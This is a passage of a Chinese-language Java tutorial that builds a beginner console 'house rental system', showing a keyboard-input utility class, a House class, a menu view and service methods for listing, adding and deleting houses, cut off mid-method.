class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Project.houserent.utils;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">工具类的作用:</span><br><span class="hljs-comment">处理各种情况的用户输入，并且能够按照程序员的需求，得到用户的控制台输入。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Utility</span> &#123;<br><span class="hljs-comment">//静态属性。。。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 功能：读取键盘输入的一个菜单选项，值：1——5的范围</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 1——5</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">readMenuSelection</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">char</span> c;<br>        <span class="hljs-keyword">for</span> (; ; ) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> readKeyBoard(<span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<span class="hljs-comment">//包含一个字符的字符串</span><br>            c = str.charAt(<span class="hljs-number">0</span>);<span class="hljs-comment">//将字符串转换成字符char类型</span><br>            <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;2&#x27;</span> &amp;&amp; <br>                c != <span class="hljs-string">&#x27;3&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;4&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;5&#x27;</span>) &#123;<br>                System.out.print(<span class="hljs-string">&quot;选择错误，请重新输入：&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> c;<br>    &#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 功能：读取键盘输入的一个字符</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 一个字符</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">readChar</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> readKeyBoard(<span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<span class="hljs-comment">//就是一个字符</span><br>        <span class="hljs-keyword">return</span> str.charAt(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 功能：读取键盘输入的一个字符，如果直接按回车，则返回指定的默认值；否则返回输入的那个字符</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> defaultValue 指定的默认值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 默认值或输入的字符</span><br><span class="hljs-comment">     */</span><br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">readChar</span><span class="hljs-params">(<span class="hljs-type">char</span> defaultValue)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> readKeyBoard(<span class="hljs-number">1</span>, <span class="hljs-literal">true</span>);<span class="hljs-comment">//要么是空字符串，要么是一个字符</span><br>        <span class="hljs-keyword">return</span> (str.length() == <span class="hljs-number">0</span>) ? defaultValue : str.charAt(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 功能：读取键盘输入的整型，长度小于2位</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 整数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">readInt</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> n;<br>        <span class="hljs-keyword">for</span> (; ; ) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> readKeyBoard(<span class="hljs-number">10</span>, <span class="hljs-literal">false</span>);<span class="hljs-comment">//一个整数，长度&lt;=10位</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                n = Integer.parseInt(str);<span class="hljs-comment">//将字符串转换成整数</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (NumberFormatException e) &#123;<br>                System.out.print(<span class="hljs-string">&quot;数字输入错误，请重新输入：&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> n;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 功能：读取键盘输入的 整数或默认值，如果直接回车，则返回默认值，否则返回输入的整数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> defaultValue 指定的默认值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 整数或默认值</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">readInt</span><span class="hljs-params">(<span class="hljs-type">int</span> defaultValue)</span> &#123;<br>        <span class="hljs-type">int</span> n;<br>        <span class="hljs-keyword">for</span> (; ; ) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> readKeyBoard(<span class="hljs-number">10</span>, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (str.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> defaultValue;<br>            &#125;<br><br><span class="hljs-comment">//异常处理...</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                n = Integer.parseInt(str);<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (NumberFormatException e) &#123;<br>                System.out.print(<span class="hljs-string">&quot;数字输入错误，请重新输入：&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> n;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 功能：读取键盘输入的指定长度的字符串</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> limit 限制的长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 指定长度的字符串</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readString</span><span class="hljs-params">(<span class="hljs-type">int</span> limit)</span> &#123;<br>        <span class="hljs-keyword">return</span> readKeyBoard(limit, <span class="hljs-literal">false</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 功能：读取键盘输入的指定长度的字符串或默认值，如果直接回车，返回默认值，否则返回字符串</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> limit 限制的长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> defaultValue 指定的默认值</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 指定长度的字符串</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readString</span><span class="hljs-params">(<span class="hljs-type">int</span> limit, String defaultValue)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> readKeyBoard(limit, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> str.equals(<span class="hljs-string">&quot;&quot;</span>)? defaultValue : str;<br>    &#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 功能：读取键盘输入的确认选项，Y或N</span><br><span class="hljs-comment"> * 将小的功能，封装到一个方法中.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> Y或N</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">readConfirmSelection</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;请输入你的选择(Y/N): 请小心选择&quot;</span>);<br>        <span class="hljs-type">char</span> c;<br>        <span class="hljs-keyword">for</span> (; ; ) &#123;<span class="hljs-comment">//无限循环</span><br>        <span class="hljs-comment">//在这里，将接受到字符，转成了大写字母</span><br>        <span class="hljs-comment">//y =&gt; Y n=&gt;N</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> readKeyBoard(<span class="hljs-number">1</span>, <span class="hljs-literal">false</span>).toUpperCase();<br>            c = str.charAt(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;Y&#x27;</span> || c == <span class="hljs-string">&#x27;N&#x27;</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.print(<span class="hljs-string">&quot;选择错误，请重新输入：&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> c;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 功能： 读取一个字符串</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> limit 读取的长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> blankReturn 如果为true ,表示 可以读空字符串。 </span><br><span class="hljs-comment">     *   如果为false表示 不能读空字符串。</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment"> *如果输入为空，或者输入大于limit的长度，就会提示重新输入。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readKeyBoard</span><span class="hljs-params">(<span class="hljs-type">int</span> limit, <span class="hljs-type">boolean</span> blankReturn)</span> &#123;<br>        <br><span class="hljs-comment">//定义了字符串</span><br><span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-comment">//scanner.hasNextLine() 判断有没有下一行</span><br>        <span class="hljs-keyword">while</span> (scanner.hasNextLine()) &#123;<br>            line = scanner.nextLine();<span class="hljs-comment">//读取这一行</span><br>           <br><span class="hljs-comment">//如果line.length=0, 即用户没有输入任何内容，直接回车</span><br><span class="hljs-keyword">if</span> (line.length() == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (blankReturn) <span class="hljs-keyword">return</span> line;<span class="hljs-comment">//如果blankReturn=true,可以返回空串</span><br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>; <span class="hljs-comment">//如果blankReturn=false,不接受空串，必须输入内容</span><br>            &#125;<br><br><span class="hljs-comment">//如果用户输入的内容大于了 limit，就提示重写输入  </span><br><span class="hljs-comment">//如果用户如的内容 &gt;0 &lt;= limit ,我就接受</span><br>            <span class="hljs-keyword">if</span> (line.length() &lt; <span class="hljs-number">1</span> || line.length() &gt; limit) &#123;<br>                System.out.print(<span class="hljs-string">&quot;输入长度（不能大于&quot;</span> + limit + <span class="hljs-string">&quot;）错误，请重新输入：&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> line;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="House类"><a href="#House类" class="headerlink" title="House类"></a>House类</h3><ol><li><p>房屋的主要信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//编号，房主，电话，地址，月租，状态</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><span class="hljs-keyword">private</span> String name;<br><span class="hljs-keyword">private</span> String phone;<br><span class="hljs-keyword">private</span> String address;<br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> rent;<br><span class="hljs-keyword">private</span> String state;<br></code></pre></td></tr></table></figure></li><li><p>构造器，getset</p></li><li><p>重写toString便于输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//为了方便的输出对象信息，我们实现toString</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span>  id +<br>            <span class="hljs-string">&quot;\t&quot;</span> + name +<br>            <span class="hljs-string">&quot;\t&quot;</span> + phone +<br>            <span class="hljs-string">&quot;\t&quot;</span> + address +<br>            <span class="hljs-string">&quot;\t&quot;</span> + rent +<br>            <span class="hljs-string">&quot;\t&quot;</span> + state;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h3><blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002001801903.png" alt="image-20221002001801903" style="zoom:50%;" /></blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002015846574.png" alt="image-20221002015846574" style="zoom:50%;" /><p>HouseView类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//显示主菜单</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">loop</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//控制显示菜单</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">char</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27; &#x27;</span>; <span class="hljs-comment">//接受用户选择</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mainMenu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">do</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;-----------------房屋出租系统----------------&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;\t\t\t1 新 增 房 源&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;\t\t\t2 查 找 房 屋&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;\t\t\t3 删 除 房 屋&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;\t\t\t4 修 改 房 源&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;\t\t\t5 房 屋 列 表&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;\t\t\t6 退      出&quot;</span>);<br>        System.out.print(<span class="hljs-string">&quot;请输入你的选择(1-6): &quot;</span>);<br>        key = Utility.readChar();<br>        <span class="hljs-keyword">switch</span> (key)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;1&#x27;</span>:<br>                System.out.println(<span class="hljs-string">&quot;新 增&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;2&#x27;</span>:<br>                System.out.println(<span class="hljs-string">&quot;查 找&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;3&#x27;</span>:<br>                System.out.println(<span class="hljs-string">&quot;删 除&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;4&#x27;</span>:<br>                System.out.println(<span class="hljs-string">&quot;修 改&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;5&#x27;</span>:<br>                System.out.println(<span class="hljs-string">&quot;房 屋 列 表&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;6&#x27;</span>:<br>                System.out.println(<span class="hljs-string">&quot;退出&quot;</span>);<br>                loop = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br><br>        &#125;<br><br>    &#125;<span class="hljs-keyword">while</span>(loop);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//程序入口</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">HouseView</span>().mainMenu();<br>System.out.println(<span class="hljs-string">&quot;--你退出房屋出租系统--&quot;</span>);<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002015942684.png" alt="image-20221002015942684" style="zoom:50%;" /><h3 id="房屋列表"><a href="#房屋列表" class="headerlink" title="房屋列表"></a>房屋列表</h3><blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002002130978.png" alt="image-20221002002130978" style="zoom:50%;" /></blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002020510914.png" alt="image-20221002020510914" style="zoom:50%;" /><p>思路分析：需要编写HouseView和HouseService</p><p>HouseService:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * HomeService.java[页面层]</span><br><span class="hljs-comment"> * //定义House[]，保存House对象</span><br><span class="hljs-comment"> * 1.响应HomeView的调用</span><br><span class="hljs-comment"> * 2.完成对房屋信息的各种操作</span><br><span class="hljs-comment"> * （增删改查crud）</span><br><span class="hljs-comment"> * 【create、read、update、delete】</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HouseService</span> &#123;<br>    <span class="hljs-keyword">private</span> House[] houses; <span class="hljs-comment">//用于存放house对象</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HouseService</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>        <span class="hljs-comment">//new houses</span><br>        houses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">House</span>[size];<span class="hljs-comment">//当创建HouseService对象,指定数组大小</span><br>        <span class="hljs-comment">//测试</span><br>        houses[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">House</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-string">&quot;112&quot;</span>,<span class="hljs-string">&quot;海淀区&quot;</span>,<span class="hljs-number">2000</span>,<span class="hljs-string">&quot;未出租&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//list方法，返回houses</span><br>    <span class="hljs-keyword">public</span> House[] list()&#123;<br>        <span class="hljs-keyword">return</span> houses;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>HouseView添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">HouseService</span> <span class="hljs-variable">houseService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HouseService</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//设置数组的大小为10</span><br><br><br><span class="hljs-comment">//listHouses()显示房屋信息</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listHouses</span><span class="hljs-params">()</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;-----------------房屋列表----------------&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;编号\t\t房主\t\t电话\t\t地址\t\t月租\t\t状态(未出租/已出租)&quot;</span>);<br>    House[] houses = houseService.list(); <span class="hljs-comment">//得到所有的方法信息</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; houses.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (houses[i]==<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        System.out.println(houses[i]);<br>    &#125;<br>    System.out.println(<span class="hljs-string">&quot;-----------------房屋列表完成----------------&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002022309300.png" alt="image-20221002022309300" style="zoom:50%;" /><h3 id="添加房屋信息"><a href="#添加房屋信息" class="headerlink" title="添加房屋信息"></a>添加房屋信息</h3><blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002001821667.png" alt="image-20221002001821667" style="zoom:50%;" /></blockquote><p>思路分析：房屋添加界面和添加方法。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002142835505.png" alt="image-20221002142835505" style="zoom:50%;" /><p>addHouse界面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addHouse</span><span class="hljs-params">()</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;-----------------添加房屋----------------&quot;</span>);<br>    System.out.print(<span class="hljs-string">&quot;姓名：&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> Utility.readString(<span class="hljs-number">8</span>);<br>    System.out.print(<span class="hljs-string">&quot;电话：&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span>  Utility.readString(<span class="hljs-number">12</span>);<br>    System.out.print(<span class="hljs-string">&quot;地址：&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> Utility.readString(<span class="hljs-number">16</span>);<br>    System.out.print(<span class="hljs-string">&quot;月租：&quot;</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">rent</span> <span class="hljs-operator">=</span> Utility.readInt();<br>    System.out.print(<span class="hljs-string">&quot;状态：&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> Utility.readString(<span class="hljs-number">3</span>);<br>    <span class="hljs-comment">//创建一个House对象，注意id是系统分配的，用户不能输入10000</span><br>    <span class="hljs-type">House</span> <span class="hljs-variable">newHouse</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">House</span>(<span class="hljs-number">0</span>,name,phone,address,rent,state);<br>    <span class="hljs-keyword">if</span> (houseService.add(newHouse))&#123;<br>        System.out.println(<span class="hljs-string">&quot;-----------------添加房屋成功----------------&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;-----------------添加房屋失败----------------&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>add方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(House newHouse)</span>&#123;<br>    <span class="hljs-comment">//判断是否还可以继续添加（暂时不考虑扩容）</span><br>    <span class="hljs-keyword">if</span> (houseNums == houses.length)&#123;<br>        System.out.println(<span class="hljs-string">&quot;数组已满，不能那个再添加了...&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//新增一个房屋</span><br>    houses[houseNums++] = newHouse;<br>    <span class="hljs-comment">//</span><br>    newHouse.setId(++idCounter);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002154455321.png" alt="image-20221002154455321" style="zoom:50%;" /><h3 id="房屋删除"><a href="#房屋删除" class="headerlink" title="房屋删除"></a>房屋删除</h3><blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002001949774.png" alt="image-20221002001949774" style="zoom:50%;" /></blockquote><p>思路分析：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002154909224.png" alt="image-20221002154909224" style="zoom:50%;" /><p>del方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">int</span> delId)</span>&#123;<br>    <span class="hljs-comment">//应当先找到删除的房屋信息对于的下标（下标不等于编号）</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; houseNums; i++) &#123;<br>        <span class="hljs-keyword">if</span> (delId==houses[i].getId())&#123;<br>            index = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> 